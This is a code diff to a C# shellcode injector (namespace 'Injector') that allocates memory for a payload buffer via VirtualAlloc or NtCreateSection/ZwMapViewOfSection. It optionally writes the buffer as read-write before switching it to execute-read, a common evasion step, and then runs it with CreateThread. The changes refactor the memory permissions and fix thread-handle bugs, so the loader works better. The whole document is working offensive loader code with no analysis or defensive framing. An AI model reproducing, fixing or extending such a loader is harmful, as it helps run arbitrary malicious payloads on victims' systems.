@@ -14,8 +14,18 @@ namespace Injector {
             #endif
             Thread.Sleep(Global.sleep_time * 1000);
             #if PINVOKE
-                IntPtr baseAddr = VirtualAlloc(0, (UInt32)Global.my_buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                #if RX
+                    uint perm = PAGE_READWRITE;
+                #else
+                    uint perm = PAGE_EXECUTE_READWRITE;
+                #endif
+                IntPtr baseAddr = VirtualAlloc(0, (UInt32)Global.my_buf.Length, MEM_COMMIT, perm);
             #else
+                #if RX
+                    uint perm = Natives.PAGE_READWRITE;
+                #else
+                    uint perm = Natives.PAGE_EXECUTE_READWRITE;
+                #endif
                 Natives.LARGE_INTEGER largeinteger = new Natives.LARGE_INTEGER();
                 largeinteger.LowPart = (uint)Global.my_buf.Length;
                 IntPtr section = IntPtr.Zero;
@@ -24,11 +34,7 @@ namespace Injector {
                     Natives.GenericAll,
                     IntPtr.Zero,
                     ref largeinteger,
-                    #if RX
-                    Natives.PAGE_READWRITE,
-                    #else
-                    Natives.PAGE_EXECUTE_READWRITE,
-                    #endif
+                    perm,
                     Natives.SecCommit,
                     IntPtr.Zero) != 0) {
                     #if _DEBUG_
@@ -54,12 +60,7 @@ namespace Injector {
                     ref viewSize,
                     1,
                     0,
-                    #if RX
-                    Natives.PAGE_READWRITE,
-                    #else
-                    Natives.PAGE_EXECUTE_READWRITE
-                    #endif
-                    ) != 0) {
+                    perm) != 0) {
                     #if _DEBUG_
                         Console.WriteLine("error in Natives.ZwMapViewOfSection");
                     #endif
@@ -80,11 +81,11 @@ namespace Injector {
             }
 
             #if RX
-                int old = 0;
+                uint old = 0;
                 #if PINVOKE
-                    VirtualProtectEx(-1, baseAddr, Global.my_buf.Length, PAGE_EXECUTE_READ, ref old);
+                    VirtualProtectEx((IntPtr)(-1), baseAddr, (UIntPtr)Global.my_buf.Length, PAGE_EXECUTE_READ, ref old);
                 #else
-                    Natives.VirtualProtectEx(-1, baseAddr, Global.my_buf.Length, PAGE_EXECUTE_READ, ref old);
+                    Natives.VirtualProtect(baseAddr, (UIntPtr)Global.my_buf.Length, Natives.PAGE_EXECUTE_READ, out old);
                 #endif
             #endif
 
@@ -107,11 +108,11 @@ namespace Injector {
                 IntPtr hThread = IntPtr.Zero;
                 UInt32 threadId = 0;
                 IntPtr pinfo = IntPtr.Zero;
-                Natives.CreateThread(0, 0, baseAddr, pinfo, 0, ref threadId);
+                hThread = Natives.CreateThread(0, 0, baseAddr, pinfo, 0, ref threadId);
                 #if _DEBUG_
-                    Console.WriteLine("Created thread 0x{0:x}...", threadId);
+                    Console.WriteLine("Created thread 0x{0:x}...", hThread);
                 #endif
-                Natives.WaitForSingleObject(threadId, 0xFFFFFFFF);
+                Natives.WaitForSingleObject(hThread, 0xFFFFFFFF);
             #endif
         }
 
@@ -166,11 +167,11 @@ namespace Injector {
 
         [DllImport("kernel32.dll")]
         static extern bool VirtualProtectEx(
-            IntPtr hHandle,
+            IntPtr hProcess,
             IntPtr lpAddress,
             UIntPtr dwSize,
             uint flNewProtect,
-            out uint lpflOldProtect);
+            ref UInt32 lpflOldProtect);
         #endif
     }
 }
